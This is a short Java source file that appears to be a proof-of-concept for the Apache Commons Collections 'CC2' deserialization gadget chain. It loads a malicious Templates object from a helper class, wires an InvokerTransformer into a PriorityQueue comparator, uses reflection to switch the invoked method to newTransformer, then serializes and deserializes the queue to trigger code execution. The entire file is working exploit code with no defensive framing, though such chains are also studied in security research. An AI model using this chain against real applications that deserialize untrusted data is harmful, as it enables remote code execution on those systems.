import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Test_CC2 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Templates templates =  ExpUtils.getEvilTemplates();
        InvokerTransformer transformer = new InvokerTransformer("toString",new Class[0],new Object[0]);
        transformer.transform(templates);

        PriorityQueue priorityQueue = new PriorityQueue(2,new TransformingComparator(transformer));
        priorityQueue.add(1);
        priorityQueue.add(1);

        ReflectUtils.setFields(transformer,"iMethodName","newTransformer");
        Field queue =   ReflectUtils.getFields(priorityQueue,"queue");
        Object[] objects = (Object[]) queue.get(priorityQueue);
        objects[0] = templates;
        objects[1] = 1;
        String path = ExpUtils.serialize(priorityQueue);
        ExpUtils.unserialize(path);


    }
}
